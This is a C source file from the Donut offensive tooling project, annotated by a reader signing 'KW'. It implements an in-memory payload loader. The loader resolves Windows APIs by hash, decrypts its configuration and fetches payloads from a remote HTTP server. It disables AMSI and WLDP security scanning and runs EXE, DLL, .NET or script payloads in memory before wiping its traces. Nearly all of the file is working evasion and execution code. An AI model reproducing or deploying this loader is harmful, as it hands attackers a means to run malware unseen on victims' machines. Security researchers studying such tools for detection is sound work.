/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "loader.h"

DWORD MainProc(PDONUT_INSTANCE inst);

HANDLE DonutLoader(PDONUT_INSTANCE inst) {
    CreateThread_t     _CreateThread;
    GetThreadContext_t _GetThreadContext;
    GetCurrentThread_t _GetCurrentThread;
    NtContinue_t       _NtContinue;
    ULONG64            hash;
    HANDLE             h = NULL;
    CONTEXT            c;
    
    // create thread and execute original entrypoint?
    if(inst->oep != 0) {
      DPRINT("Resolving address of CreateThread");
      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.CreateThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
      _CreateThread = (CreateThread_t)xGetProcAddress(inst, hash, inst->iv);
      
      // api resolved?
      if(_CreateThread != NULL) {
        // create new thread
        DPRINT("Creating new thread");
        h = _CreateThread(NULL, 0, ADR(LPTHREAD_START_ROUTINE, MainProc), (LPVOID)inst, 0, NULL);
      } else {
        DPRINT("FAILED");
        return (HANDLE)-1;
      }
      
      DPRINT("Resolving address of NtContinue");
      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.NtContinue) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
      _NtContinue = (NtContinue_t)xGetProcAddress(inst, hash, inst->iv);
      
      DPRINT("Resolving address of GetThreadContext");
      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetThreadContext) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
      _GetThreadContext = (GetThreadContext_t)xGetProcAddress(inst, hash, inst->iv);

      DPRINT("Resolving address of GetCurrentThread");
      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetCurrentThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
      _GetCurrentThread = (GetCurrentThread_t)xGetProcAddress(inst, hash, inst->iv);
      
      if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) {
        c.ContextFlags = CONTEXT_FULL;
        _GetThreadContext(_GetCurrentThread(), &c);
        #ifdef _WIN64
          c.Rip = inst->oep;
          c.Rsp &= -16;
        #else
          c.Eip = inst->oep;
          c.Esp &= -4;
        #endif
        DPRINT("Calling NtContinue");
        //__debugbreak();
        _NtContinue(&c, FALSE);
      }
    } else {
      // execute in existing thread
      MainProc(inst);
    }
    return h;
}

DWORD MainProc(PDONUT_INSTANCE inst) {
    // KW: TODO: Determine where this PDONUT_INSTANCE comes from.


    ULONG                i, ofs, wspace, fspace, len;
    ULONG64              sig;
    DONUT_ASSEMBLY       assembly;
    PDONUT_MODULE        mod, unpck;
    VirtualAlloc_t       _VirtualAlloc;
    VirtualFree_t        _VirtualFree;
    RtlExitUserProcess_t _RtlExitUserProcess;
    LPVOID               pv, ws;
    ULONG64              hash;
    BOOL                 disabled, term;
    NTSTATUS             nts;
    PCHAR                str;
    CHAR                 path[MAX_PATH];
    
    DPRINT("Maru IV : %" PRIX64, inst->iv);
    
    /* KW: Resolve function calls used for creating threads */
    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.VirtualAlloc) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
    DPRINT("Resolving address for VirtualAlloc() : %" PRIX64, hash);
    _VirtualAlloc = (VirtualAlloc_t)xGetProcAddress(inst, hash, inst->iv);
    
    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.VirtualFree) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
    DPRINT("Resolving address for VirtualFree() : %" PRIX64, hash);
    _VirtualFree  = (VirtualFree_t) xGetProcAddress(inst, hash,  inst->iv);
    
    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.RtlExitUserProcess) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
    DPRINT("Resolving address for RtlExitUserProcess() : %" PRIX64, hash);
    _RtlExitUserProcess  = (RtlExitUserProcess_t) xGetProcAddress(inst, hash,  inst->iv);
    
    if(_VirtualAlloc == NULL || _VirtualFree == NULL || _RtlExitUserProcess == NULL) {
      DPRINT("FAILED!.");
      return -1;
    }
    
    // KW: Printing the address of the two functions that were resolved above.
    DPRINT("VirtualAlloc : %p VirtualFree : %p", (LPVOID)_VirtualAlloc, (LPVOID)_VirtualFree);
    
    // Allocates memory in current process with read/write permissions
    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    DPRINT("Allocating %i bytes of RW memory", inst->len);
    pv = _VirtualAlloc(NULL, inst->len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if(pv == NULL) {
      DPRINT("Memory allocation failed...");
      /* KW: We have the option to terminate the host process, the one we live in, if memory allocation fails */
      // terminate host process?
      if(inst->exit_opt == DONUT_OPT_EXIT_PROCESS) {
        DPRINT("Terminating host process");
        _RtlExitUserProcess(0);
      }
      return -1;
    }
    
    /* KW: copy the Donut instance over to the area of memory that was just allocatd.
      This includes more than just the shellcode, it is the entire structure defined */
    DPRINT("Copying %i bytes of data to memory %p", inst->len, pv);
    Memcpy(pv, inst, inst->len);
    inst = (PDONUT_INSTANCE)pv;
    
    /* KW: This is the local function copy of the assembly */
    DPRINT("Zero initializing PDONUT_ASSEMBLY");
    Memset(&assembly, 0, sizeof(assembly));
    
    // if encryption used
    if(inst->entropy == DONUT_ENTROPY_DEFAULT) {
      PBYTE inst_data;
      // load pointer to data just past len + key
      /* KW: inst_data is a pointer to a block of BYTE data. The address is based on the struct alignment of DONUT_INSTANCE
        and placesit at the location in memory the module exists. It will be an encrypted chunk of memory. */
      inst_data = (PBYTE)inst + offsetof(DONUT_INSTANCE, api_cnt);
      
      DPRINT("Decrypting %li bytes of instance", inst->len);
      
      // KW: As stated, used to decrypt the module in place.
      donut_decrypt(inst->key.mk, 
              inst->key.ctr, 
              inst_data, 
              inst->len - offsetof(DONUT_INSTANCE, api_cnt));
      
      DPRINT("Generating hash to verify decryption");
      ULONG64 mac = maru(inst->sig, inst->iv);
      DPRINT("Instance : %"PRIX64" | Result : %"PRIX64, inst->mac, mac);
      
      if(mac != inst->mac) {
        DPRINT("Decryption of instance failed");
        goto erase_memory;
      }
    }

    /* KW: Resolve and save the address of LoadLibraryA for later use */
    DPRINT("Resolving LoadLibraryA");
    inst->api.addr[0] = xGetProcAddress(inst, inst->api.hash[0], inst->iv);
    if(inst->api.addr[0] == NULL) return -1;
    
    str = (PCHAR)inst->dll_names;
    
    // load the DLL required
    /* KW: str is a character string that contains the DLLs, by name and separated by semi-colon, that should be loaded.
      This will loop over the list, splitting it, and loading the DLL */
    // KW: TODO: Is this list dynamic or how does it change
    for(;;) {
      // store string until null byte or semi-colon encountered
      for(i=0; str[i] != '\0' && str[i] !=';' && i<MAX_PATH; i++) path[i] = str[i];
      // nothing stored? end
      if(i == 0) break;
      // skip name plus one for separator
      str += (i + 1);
      // store null terminator
      path[i] = '\0';
      DPRINT("Loading %s", path);
      inst->api.LoadLibraryA(path);
    }
    
    /* KW: With the DLLs loaded, now resolve individual APIs that are required. */
    DPRINT("Resolving %i API", inst->api_cnt);
    for(i=1; i<inst->api_cnt; i++) {
      DPRINT("Resolving API address for %016llX", inst->api.hash[i]);
        
      inst->api.addr[i] = xGetProcAddress(inst, inst->api.hash[i], inst->iv);
      
      if(inst->api.addr[i] == NULL) {
        DPRINT("Failed to resolve API");
        goto erase_memory;
      }
    }
    
    /* KW: Determine where the module is located and store it in our `mod` variable for further processing.
    */
    if(inst->type == DONUT_INSTANCE_HTTP) {
      /* If it is a HTTP payload, download it  and save to memory */
      DPRINT("Module is stored on remote HTTP server.");
      if(!DownloadFromHTTP(inst)) goto erase_memory;
      mod = inst->module.p;
    } 
    else if(inst->type == DONUT_INSTANCE_DNS) {
      DPRINT("Module is stored on remote DNS server. (Currently unsupported)");
      goto erase_memory;
      //if(!DownloadFromDNS(inst)) goto erase_memory;
      mod = inst->module.p;
    } else
    if(inst->type == DONUT_INSTANCE_EMBED) {
      DPRINT("Module is embedded.");
      mod = (PDONUT_MODULE)&inst->module.x;
    }
    
    // try bypassing AMSI and WLDP?
    if(inst->bypass != DONUT_BYPASS_NONE) {
      // Try to disable AMSI
      disabled = DisableAMSI(inst);
      DPRINT("DisableAMSI %s", disabled ? "OK" : "FAILED");
      if(!disabled && inst->bypass == DONUT_BYPASS_ABORT) 
        goto erase_memory;
      
      // Try to disable WLDP
      disabled = DisableWLDP(inst);
      DPRINT("DisableWLDP %s", disabled ? "OK" : "FAILED");
      if(!disabled && inst->bypass == DONUT_BYPASS_ABORT) 
        goto erase_memory;
    }
    
    // module is compressed?
    if(mod->compress != DONUT_COMPRESS_NONE) {
      DPRINT("Compression engine is %"PRIx32, mod->compress);
      
      DPRINT("Allocating %zd bytes of memory for decompressed file and module information", 
        mod->len + sizeof(DONUT_MODULE));
      
      // allocate memory for module information + size of decompressed data
      unpck = (PDONUT_MODULE)_VirtualAlloc(
        NULL, ((sizeof(DONUT_MODULE) + mod->len) -4096) + 4096, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
      if(unpck == NULL) goto erase_memory;
      
      // copy the existing information to new block
      DPRINT("Duplicating DONUT_MODULE");
      Memcpy(unpck, mod, sizeof(DONUT_MODULE));
      
      // decompress module data into new block
      DPRINT("Decompressing %"PRId32 " -> %"PRId32, mod->zlen, mod->len);
      
      if(mod->compress == DONUT_COMPRESS_LZNT1  ||
         mod->compress == DONUT_COMPRESS_XPRESS ||
         mod->compress == DONUT_COMPRESS_XPRESS_HUFF)
      {
        nts = inst->api.RtlGetCompressionWorkSpaceSize(
          (mod->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, &wspace, &fspace);
      
        if(nts != 0) {
          DPRINT("RtlGetCompressionWorkSpaceSize failed with %"PRIX32, nts);
          goto erase_memory;
        }
        
        DPRINT("WorkSpace size : %"PRId32" | Fragment size : %"PRId32, wspace, fspace);
        
        ws = (PDONUT_MODULE)_VirtualAlloc(
          NULL, wspace, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        DPRINT("Decompressing with RtlDecompressBufferEx(%s)",
          mod->compress == DONUT_COMPRESS_LZNT1 ? "LZNT" : 
          mod->compress == DONUT_COMPRESS_XPRESS ? "XPRESS" : "XPRESS HUFFMAN");
                
        nts = inst->api.RtlDecompressBufferEx(
              (mod->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
              (PUCHAR)unpck->data, mod->len, 
              (PUCHAR)&mod->data, mod->zlen, &len, ws);
              
        _VirtualFree(ws, 0, MEM_RELEASE | MEM_DECOMMIT);
      
        if(nts == 0) {
          // assign pointer to mod
          mod = unpck;
        } else {
          DPRINT("RtlDecompressBufferEx failed with %"PRIX32, nts);
          goto erase_memory;
        }
      } else if(mod->compress == DONUT_COMPRESS_APLIB) {
        DPRINT("Decompressing with aPLib");
        aP_depack((PUCHAR)mod->data, (PUCHAR)unpck->data);
        DPRINT("Done");
        mod = unpck;
      } else {
        //
      }
    }
    DPRINT("Checking type of module");
    
    // unmanaged EXE/DLL?
    if(mod->type == DONUT_MODULE_DLL ||
       mod->type == DONUT_MODULE_EXE) {
      RunPE(inst, mod);
    } else
    // .NET EXE/DLL?
    if(mod->type == DONUT_MODULE_NET_DLL || 
       mod->type == DONUT_MODULE_NET_EXE)
    {
      if(LoadAssembly(inst, mod, &assembly)) {
        RunAssembly(inst, mod, &assembly);
      }
      FreeAssembly(inst, &assembly);
    } else 
    // vbs or js?
    if(mod->type == DONUT_MODULE_VBS ||
       mod->type == DONUT_MODULE_JS)
    {
      RunScript(inst, mod);
    }
    
erase_memory:
    // if module was downloaded
    if(inst->type == DONUT_INSTANCE_HTTP || 
       inst->type == DONUT_INSTANCE_DNS) 
    {
      if(inst->module.p != NULL) {
        // overwrite memory with zeros
        Memset(inst->module.p, 0, (DWORD)inst->mod_len);
        
        // free memory
        _VirtualFree(inst->module.p, 0, MEM_RELEASE | MEM_DECOMMIT);
        inst->module.p = NULL;
      }
    }
    
    // should we call RtlExitUserProcess?
    term = (BOOL) (inst->exit_opt == DONUT_OPT_EXIT_PROCESS);
    
    DPRINT("Erasing RW memory for instance");
    Memset(inst, 0, inst->len);
    
    DPRINT("Releasing RW memory for instance");
    _VirtualFree(inst, 0, MEM_DECOMMIT | MEM_RELEASE);
    
    if(term) {
      DPRINT("Terminating host process");
      // terminate host process
      _RtlExitUserProcess(0);
    }
    DPRINT("Returning to caller");
    // return to caller, which invokes RtlExitUserThread
    return 0;
}

int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[DONUT_MAX_NAME]) {
    return inst->api.MultiByteToWideChar(CP_ACP, 0, input, 
      -1, output, DONUT_MAX_NAME);
}

#include "peb.c"             // resolve functions in export table
#include "http_client.c"     // Download module from HTTP server
//#include "dns_client.c"      // Download module from DNS server
#include "inmem_dotnet.c"    // .NET assemblies
#include "inmem_pe.c"        // Unmanaged PE/DLL files
#include "inmem_script.c"    // VBS/JS files

#include "bypass.c"          // Bypass AMSI and WLDP
#include "getpc.c"           // code stub to return program counter (always at the end!)

// the following code is *only* for development purposes
// given an instance file, it will run as if running on a target system
// attach a debugger to host process
#ifdef DEBUG

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
    FILE           *fd;
    struct stat     fs;
    PDONUT_INSTANCE inst;
    DWORD           old;
    HANDLE          h;
    
    if(argc != 2) {
      printf("  [ usage: loader <instance>\n");
      return 0;
    }
    // get size of instance
    if(stat(argv[1], &fs) != 0) {
      printf("  [ unable to obtain size of instance.\n");
      return 0;
    }
    
    // zero size?
    if(fs.st_size == 0) {
      printf("  [ invalid instance.\n");
      return 0;
    }
    
    // try open for reading
    fd = fopen(argv[1], "rb");
    if(fd == NULL) {
      printf("  [ unable to open %s.\n", argv[1]);
      return 0;
    }

    // allocate memory
    inst = (PDONUT_INSTANCE)VirtualAlloc(NULL, fs.st_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if(inst != NULL) {
      fread(inst, 1, fs.st_size, fd);
      
      // change protection to PAGE_EXECUTE_READ
      if(VirtualProtect((LPVOID)inst, fs.st_size, PAGE_EXECUTE_READ, &old)) {
        printf("Running...");
      
        // run payload with instance
        h = DonutLoader(inst);
        
        if(h != (HANDLE)-1 && inst->oep != 0) {
          printf("\nWaiting...");
          WaitForSingleObject(h, INFINITE);
        }
      }
      // deallocate
      VirtualFree((LPVOID)inst, 0, MEM_DECOMMIT | MEM_RELEASE);
    }
    fclose(fd);
    return 0;
}
#endif
